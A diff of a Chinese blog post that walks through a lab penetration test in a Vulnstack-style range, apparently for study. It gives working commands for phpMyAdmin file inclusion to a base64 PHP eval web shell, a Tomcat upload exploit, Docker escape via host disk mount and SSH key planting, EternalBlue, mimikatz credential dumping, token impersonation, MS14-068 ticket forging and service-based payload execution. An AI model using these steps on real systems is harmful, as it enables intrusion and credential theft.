@@ -483,45 +483,47 @@
 <p><img src="https://img-blog.csdnimg.cn/2020111111304336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMDA3MDQz,size_16,color_FFFFFF,t_70#pic_center" alt="img"></p>
 <p>配置环境在这里就不记录了，直接从开打写起。</p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>由于默认已经知道了HOST1的ip，但直接访问ip显示404，所以这里我们用nmap扫一下。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV <span class="number">192.168</span><span class="number">.111</span><span class="number">.138</span></span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">nmap -T4 -sC -sV 192.168.111.138</code></pre>
 
 <p>结果如图：</p>
 <p><img src="/Downloads/20220405221129.png" alt="20220405221129"></p>
 <p>在这里我们能够看见它的2002端口的tomcat以及2003端口的phpMyAdmin及其相应的版本。</p>
 <h2 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h2><h3 id="phpMyAdmin文件包含漏洞"><a href="#phpMyAdmin文件包含漏洞" class="headerlink" title="phpMyAdmin文件包含漏洞"></a>phpMyAdmin文件包含漏洞</h3><p>看到4.8.1的phpMyAdmin我们自然就能想到它的文件包含漏洞，这里我们测试一下该漏洞是否存在：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://http://192.168.0.105:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;http:&#x2F;&#x2F;192.168.0.105:2003&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</code></pre>
 
 <p><img src="/Downloads/20220403163321.png" alt="20220403163321"></p>
 <p>这里我们可以看到漏洞的确存在。那么我们就要想办法包含恶意文件拿shell了，我这里先想到的是使用包含日志的方式。在SQL处执行如下语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">select &#39;&lt;?php phpinfo();?&gt;&#39;</code></pre>
 
 <p>并在f12中查看sessionid，我们最后要访问的路径为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_datadict.php%253f/../../../../../../../../../tmp/sess_sessionid</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_sessionid</code></pre>
 
 <p><img src="/Downloads/20220403164423.png" alt="20220403164423"></p>
 <p>这里我们看到的确是成功访问到含有我们写入的phpinfo的session文件的。接下来就可以写shell了，但不知道为啥，我这里写shell总是不成功。于是这里我换了个方法（和网上的大佬学的。。）。虽然session文件中没让我拿到shell，但phpinfo的出现说明session文件的确是可以解析PHP代码的，那我就直接利用session文件创建一个shell文件。执行sql语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT ‘&lt;?php file_put_contents(&quot;extrader.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pPz4=&quot;));?&gt;’</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">SELECT ‘&lt;?php file_put_contents(&quot;extrader.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pPz4&#x3D;&quot;));?&gt;’</code></pre>
 
 <p>写入后我们再一次访问session文件（访问后才能执行我们刚刚写入的创建shell文件的命令）</p>
 <p>然后蚁剑成功连接</p>
 <p><img src="/Downloads/20220404152030.png" alt="20220404152030"></p>
 <p>由于之前开环境的时候已经知道了这个phpMyAdmin是跑在docker容器中的，所以这里作为攻击者，我们要当作什么也不知道，然后去检测一下是否在容器中，一般有两种方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">检查/.dockerenv文件是否存在</span><br><span class="line">检查/proc/1/cgroup内是否包含&quot;docker&quot;等字符串。</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">检查&#x2F;.dockerenv文件是否存在
+检查&#x2F;proc&#x2F;1&#x2F;cgroup内是否包含&quot;docker&quot;等字符串。</code></pre>
 
 <p><img src="/Downloads/20220403181608.png" alt="20220403181608"></p>
 <p>这里的dockerenv文件的确存在，说明确实是跑在docker容器中的。</p>
 <p>按道理这个时候我们就已经可以准备想办法docker逃逸了，但是刚才在扫描的时候我们还扫到了一个tomcat，所以这里我们看一下tomcat这边有没有什么可以拿shell的地方。</p>
 <h3 id="Tomcat任意文件上传漏洞"><a href="#Tomcat任意文件上传漏洞" class="headerlink" title="Tomcat任意文件上传漏洞"></a>Tomcat任意文件上传漏洞</h3><p>我们知道Tomcat的漏洞比较出名的有CVE-2017-12615，CVE-2017-12615是Tomcat中间件的任意文件上传漏洞，但此漏洞影响范围是Apache Tomcat 7.0.0 – 7.0.79，我们靶机的Tomcat版本似乎不再影响范围之内，是实际中Tomcat 5-9均存在类似CVE-2017-12615的利用方式，同样可以类比运用，但这不归属于CVE-2017-12615漏洞。</p>
 <p>这里我们直接用kali自带的searchsploit来查找Tomcat的8.5.19版本的利用脚本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit tomcat 8.5.19   // 查找tomcat 8.5.19的利用脚本</span><br><span class="line">searchsploit -m /exploit/jsp/webapps/42966.py   //将利用脚本复制到当前的工作目录（-m参数）</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">searchsploit tomcat 8.5.19   &#x2F;&#x2F; 查找tomcat 8.5.19的利用脚本
+searchsploit -m &#x2F;exploit&#x2F;jsp&#x2F;webapps&#x2F;42966.py   &#x2F;&#x2F;将利用脚本复制到当前的工作目录（-m参数）</code></pre>
 
 <p>![image-20220405230141346](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220405230141346.png)</p>
 <p>这里给出了我们可以使用42966.py脚本，我们用该脚本检测一下漏洞是否存在：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http://192.168.0.105:2002/</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">python 42966.py -u http:&#x2F;&#x2F;192.168.0.105:2002&#x2F;</code></pre>
 
 <p><img src="/Downloads/20220404152221.png" alt="20220404152221"></p>
 <p>看样子漏洞的确是存在的，接下来就可以进行攻击了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http://192.168.0.105:2002/ -p pwn</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">python 42966.py -u http:&#x2F;&#x2F;192.168.0.105:2002&#x2F; -p pwn</code></pre>
 
 <p><img src="/Downloads/20220404153336.png" alt="20220404153336"></p>
 <p>这样就成功弹回一个shell了（不过说实话这个shell真丑。。。）</p>
@@ -531,7 +533,7 @@
 <p>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
 <p>在之前扫描时我们看到了目标主机的22端口是开着的，也就是说如果，我们能够向主机中写入任意文件，我们就可以通过写ssh密钥的方式实现ssh免密登陆。</p>
 <p>说干就干，我们先在根目录下创建一个用于挂载主机的目录hack，并用mount命令将外部宿主机磁盘设备挂载到hack下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /hack</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">mount &#x2F;dev&#x2F;sda1 &#x2F;hack</code></pre>
 
 <p>![image-20220405231951613](&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220405231951613.png)</p>
 <p>挂载成功了，此时我们就可以通过访问容器内部的&#x2F;hack路径来达到访问整个宿主机的目的。</p>
@@ -539,34 +541,40 @@
 <p><img src="/Downloads/20220404163426.png" alt="20220404163426"></p>
 <p>发现这里有.ssh目录，那么我们就可以往该文件夹内写密钥了。</p>
 <p>先在攻击机本地生成密钥：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f hack</span><br><span class="line">chmod 600 hack    // 赋予执行权限</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">ssh-keygen -f hack
+chmod 600 hack    &#x2F;&#x2F; 赋予执行权限</code></pre>
 
 <p>由于我用echo无论如何也写不进文件，所以这里我直接在服务器上开了个http服务器，然后在容器中下载hack.pub文件，最后执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp hack.pub /hack/home/ubuntu/.ssh/authorized_keys </span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">cp hack.pub &#x2F;hack&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys </code></pre>
 
 <p>随后ssh连接就行了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i hack ubuntu@192.168.0.105</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">ssh -i hack ubuntu@192.168.0.105</code></pre>
 
 <p><img src="/Downloads/20220404175951.png" alt="20220404175951"></p>
 <p>连接成功，这里我们用msf生成木马并上传到ubuntu中，并在本地开启监听，然后在ubuntu中运行木马文件。</p>
 <p><img src="/Downloads/20220404180623.png" alt="20220404180623"></p>
 <p>这样msf就已经上线了。</p>
 <h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="WIN7"><a href="#WIN7" class="headerlink" title="WIN7"></a>WIN7</h3><p>剩下就开始挂代理打了，我们发现它有两张网卡，所以直接扫描内网网卡主机存活：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probe</code></pre>
 
 <p><img src="/Downloads/20220404190041.png" alt="20220404190041"></p>
 <p>这里我们扫到了两台机子，分别是192.168.183.129和192.168.246.130。通过端口扫描又知道他们都开了445端口（这里忘截图了）</p>
 <p>那我们就本能地想到永恒之蓝漏洞了，经过扫描发现这里的两台主机都可能存在永恒之蓝漏洞（这里又忘截图了。。。）</p>
 <p>既然扫到了，那直接打就行了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.183.129</span><br><span class="line">set lport 4444</span><br><span class="line">set AutoRunScript post/windows/manage/migrate             // 自动迁移进程</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue
+set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp
+set rhost 192.168.183.129
+set lport 4444
+set AutoRunScript post&#x2F;windows&#x2F;manage&#x2F;migrate             &#x2F;&#x2F; 自动迁移进程
+run</code></pre>
 
 <p>这里总是在最后一步失败，一开始不知道为啥，到网上一看发现网上的大佬们并不是用的msf自带的代理，于是抱着试一试的心态我换ew重新试了一遍</p>
 <p><img src="/Downloads/20220404210514.png" alt="20220404210514"></p>
 <p>它居然就行了。。。不过ew的连接特别容易断，于是这里从网上大佬们那发现了一个go写的代理工具chisel，十分稳定和强大，项目地址：<a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a> 。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 2336 --socks5    //向跳板机上面上传./chisel文件并打开服务端</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">.&#x2F;chisel server -p 2336 --socks5    &#x2F;&#x2F;向跳板机上面上传.&#x2F;chisel文件并打开服务端</code></pre>
 
 <p><img src="/Downloads/20220406173846.png" alt="20220406173846"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 192.168.111.139:2333 socks  //攻击机上执行</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">.&#x2F;chisel client 192.168.111.139:2333 socks  &#x2F;&#x2F;攻击机上执行</code></pre>
 
 <p><img src="/Downloads/20220406173905.png" alt="20220406173905"></p>
 <p>这样拿到的连接就十分稳定了。</p>
@@ -574,16 +582,18 @@
 <p><img src="/Downloads/20220406174408.png" alt="20220406174408"></p>
 <p>system，非常nice，那么我们就可以直接mimikatz抓取明文密码了。</p>
 <p>抓取命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug   //提取权限</span><br><span class="line">sekurlsa::logonpasswords   //抓取密码</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">privilege::debug   &#x2F;&#x2F;提取权限
+sekurlsa::logonpasswords   &#x2F;&#x2F;抓取密码</code></pre>
 
 <p>就在这个时候，意外发生了</p>
 <p><img src="/Downloads/20220406174343.png" alt="20220406174343"></p>
 <p>好家伙一个权限问题给我整不会了，我们不是已经是system权限了吗？那就先放开这条路，去看看有没有高权限的令牌可用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens-u    //列出可用的token</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">use incognito
+list_tokens-u    &#x2F;&#x2F;列出可用的token</code></pre>
 
 <p><img src="/Downloads/20220406174008.png" alt="20220406174008"></p>
 <p>那就先抓个域用户douser的令牌吧，毕竟只有它有权限查看域内信息。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito_token “DEMO \douser”  //抓取DEMO域中的域用户douser</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">incognito_token “DEMO \douser”  &#x2F;&#x2F;抓取DEMO域中的域用户douser</code></pre>
 
 <p><img src="/Downloads/20220406175504.png" alt="20220406175504"></p>
 <p>收集一波域内信息：</p>
@@ -598,7 +608,7 @@
 <p>我们先把MS-14068.exe传到域控上，注意不要传到它默认的Windows&#x2F;System32下，否则的话会执行失败。如下图</p>
 <p><img src="/Downloads/20220406174924.png" alt="20220406174924"></p>
 <p>然后接下来我们直接用MS-14068制作高权限票据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u 域用户@域名 -s 该与用户的sid -d 域控ip或名称 -p 该与用户的密码</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">MS14-068.exe -u 域用户@域名 -s 该与用户的sid -d 域控ip或名称 -p 该与用户的密码</code></pre>
 
 <p><img src="/Downloads/20220405203528.png" alt="20220405203528"></p>
 <p>如上图，成功生成票据。接下来我们用mimikatz注入内存就好</p>
@@ -607,7 +617,8 @@
 <p>大功告成啦。我们看一下能不能远程访问到域控</p>
 <p><img src="/Downloads/20220405203621.png" alt="20220405203621"></p>
 <p>可以，那剩下的就简单了，先用copy命令向域控传一个正向马，msf挂代理监听，最后sc创建服务执行这个正向马。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\域控名 create shell binpath= &quot;c:\icesoul.exe&quot;    //创建一个服务</span><br><span class="line">sc \\域控名 start shell   //执行这个服务</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">sc \\域控名 create shell binpath&#x3D; &quot;c:\icesoul.exe&quot;    &#x2F;&#x2F;创建一个服务
+sc \\域控名 start shell   &#x2F;&#x2F;执行这个服务</code></pre>
 
 <p><img src="/Downloads/20220405212008.png" alt="20220405212008"></p>
 <p><img src="/Downloads/20220405212020.png" alt="20220405212020"></p>
